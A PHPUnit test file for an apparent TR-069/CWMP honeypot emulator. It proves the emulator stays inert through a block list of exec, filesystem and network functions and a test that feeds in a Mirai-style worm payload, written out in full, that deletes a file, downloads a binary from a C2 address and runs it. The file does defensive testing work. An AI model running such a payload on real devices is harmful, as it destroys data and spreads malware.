<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Tr069;

use Funnypot\Protocol\Tr069\Tr069Config;
use Funnypot\Protocol\Tr069\Tr069Server;
use Funnypot\Protocol\Tr069\Tr069Session;
use PHPUnit\Framework\TestCase;

/**
 * Enforces the hard INERT invariant: the TR-069 / CWMP emulator never executes a command, opens a file
 * from attacker input, fetches a captured C2 URL, or resolves a host. A structural token-scan of the
 * sources (no exec / filesystem-from-input / egress / DOM-XXE primitives) plus a functional proof that
 * a destructive worm payload leaves a sentinel file untouched while the C2 URL is still captured.
 */
final class Tr069InertTest extends TestCase
{
    use Tr069TestFrames;

    /** Execution / filesystem-from-input / egress / XML-entity functions that must never appear as calls. */
    private const BANNED = [
        'exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen', 'pcntl_exec',
        'eval', 'assert', 'create_function',
        'fopen', 'opendir', 'scandir', 'readfile', 'file_get_contents', 'file_put_contents',
        'unlink', 'rmdir', 'mkdir', 'rename', 'copy', 'glob',
        'fsockopen', 'stream_socket_client', 'file', 'get_headers', 'dns_get_record', 'gethostbyname',
        // No DOM/SimpleXML on attacker SOAP: regex-only parsing keeps XXE / billion-laughs impossible.
        'simplexml_load_string', 'simplexml_load_file', 'loadxml', 'loadhtml',
    ];

    /** Socket I/O the listener itself needs (binding its own port / replying) is allowed. */
    private const ALLOWED = [
        'fwrite', 'fread', 'fclose', 'feof', 'stream_socket_server', 'stream_socket_accept',
        'stream_set_blocking', 'stream_select', 'stream_socket_get_name', 'get_resource_id',
    ];

    /**
     * @return list<string>
     */
    private function tr069Sources(): array
    {
        $dir = dirname(__DIR__, 3) . '/src/Protocol/Tr069';
        $files = glob($dir . '/*.php');
        self::assertNotEmpty($files, 'TR-069 sources must be found');

        return $files;
    }

    public function test_no_execution_filesystem_or_egress_calls_in_sources(): void
    {
        foreach ($this->tr069Sources() as $file) {
            $tokens = token_get_all((string) file_get_contents($file));
            $base = basename($file);

            // No shell-exec backticks anywhere in code.
            foreach ($tokens as $t) {
                if ($t === '`') {
                    self::fail("backtick shell execution in {$base}");
                }
            }

            // Every function-call name (a T_STRING immediately before '(') must not be banned.
            $count = count($tokens);
            for ($i = 0; $i < $count; $i++) {
                $t = $tokens[$i];
                if (!is_array($t) || $t[0] !== T_STRING) {
                    continue;
                }
                $name = strtolower($t[1]);
                $j = $i + 1;
                while ($j < $count && is_array($tokens[$j]) && in_array($tokens[$j][0], [T_WHITESPACE, T_COMMENT, T_DOC_COMMENT], true)) {
                    $j++;
                }
                if ($j >= $count || $tokens[$j] !== '(') {
                    continue; // not a call
                }
                self::assertNotContains($name, self::BANNED, "banned call {$name}() in {$base}");
            }
        }

        // A guard on the guard: the socket helpers really are present (so ALLOWED is meaningful).
        $server = (string) file_get_contents(dirname(__DIR__, 3) . '/src/Protocol/Tr069/Tr069Server.php');
        self::assertStringContainsString('stream_socket_server(', $server);
    }

    public function test_destructive_worm_payload_leaves_a_sentinel_untouched(): void
    {
        $sentinel = sys_get_temp_dir() . '/funnypot_cwmp_sentinel_' . bin2hex(random_bytes(4)) . '.txt';
        file_put_contents($sentinel, 'DO NOT DELETE');

        try {
            $events = [];
            $server = new Tr069Server(new Tr069Config(), function (array $e) use (&$events): void {
                $events[] = $e;
            });
            $session = new Tr069Session('203.0.113.99', 45000, 1);

            // A command that WOULD destroy the sentinel and fetch a C2 binary if it were ever run.
            $payload = "`rm -rf {$sentinel}; wget http://203.0.113.9/bins/mirai.arm7 -O {$sentinel}; chmod 777 {$sentinel}; ./x`";
            $session->inbuf = self::setNtpServersRequest($payload);
            $server->processInbound($session);

            // Proof of inertness: the file is still there, byte-for-byte.
            self::assertFileExists($sentinel, 'the payload must not have been executed');
            self::assertSame('DO NOT DELETE', (string) file_get_contents($sentinel));

            // The attempt was captured, and a fabricated success response (not an error) was returned.
            $exploit = null;
            foreach ($events as $e) {
                if (($e['event'] ?? '') === 'cwmp_exploit') {
                    $exploit = $e;
                }
            }
            self::assertNotNull($exploit, 'the attempt is captured as intel');
            self::assertStringContainsString('rm -rf', $exploit['command']);
            self::assertStringContainsString('http://203.0.113.9/bins/mirai.arm7', $exploit['download_url']);
            self::assertStringContainsString('SetNTPServersResponse', $session->outbuf);
        } finally {
            @unlink($sentinel);
        }
    }
}
